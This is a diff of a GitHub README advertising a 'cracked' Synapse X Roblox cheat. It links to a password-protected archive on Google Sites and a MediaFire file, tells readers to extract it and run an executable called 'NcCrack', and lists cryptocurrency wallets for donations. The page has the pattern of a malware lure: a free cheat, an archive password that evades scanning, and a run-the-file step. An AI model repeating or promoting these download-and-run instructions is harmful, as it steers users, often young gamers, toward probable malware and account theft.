@@ -1,48 +1,82 @@
-# Free-ROBLOX-cheat-Injector-2023
-Our cheat supports windows 7/10/11
+# SYNAPSE-X-CRACKED-ROBLOX
 
+# IMPORTANT 
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-# Roblox Cheat
-Auto-Updater Fixed
+# Support the author ( On chips )
 
-More Functions
+- BTC - bc1q7kmj3pyhcm2n02z6p7gxvusqv55pt7vcgxe6ut
 
-New UI
+- ETH - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
 
-New Logo
+- TRC-20 ( Usdt ) - TRYhDuV6qVcHQjfqEgF15w72TdxCMLDt9b
 
-New Injection
+- BNB - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
 
-Script Hub Added
+-----------------------------------------------------------------------------------------------------------------------
 
-Contact Us Form Added
+# How to install?
 
-LogIn System Added (PERMANENT KEY | THE KEY NEVER CHANGES)
+- Visit our website
 
-Now it shows you when the exploit was updated
+- Download the archive 
 
-New Loading Screen
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
 
-Settings Added
+- Run the file ( NcCrack )
 
-Removed Light Theme
+- Launch the game
 
-Save File Function Added (To save your scripts)
+- In-game INSERT button
 
-New Cursors
+-----------------------------------------------------------------------------------------------------------------------
 
-More fun than before.
-# [How to use Roblox cheat Free?]
-Extract files.
+# SYSTEM REQUIREMENTS
 
-Open HYROCOPT HACK.exe.
+- Processor | Intel | Amd Processor |
 
-Open Roblox and and press F10.
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
 
-Enjoy
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
+
+ # ChangeLog:
+ 
+- Auto-Updater Fixed
+
+- More Functions
+
+- New UI
+
+- New Logo
+
+- New Injection
+
+- Script Hub Added
+
+- Contact Us Form Added
+
+- LogIn System Added (PERMANENT KEY | THE KEY NEVER CHANGES)
+
+- Now it shows you when the exploit was updated
+
+- New Loading Screen
+
+- Settings Added
+
+- Removed Light Theme
+
+- Save File Function Added (To save your scripts)
+
+- New Cursors
+
+- More fun than before.
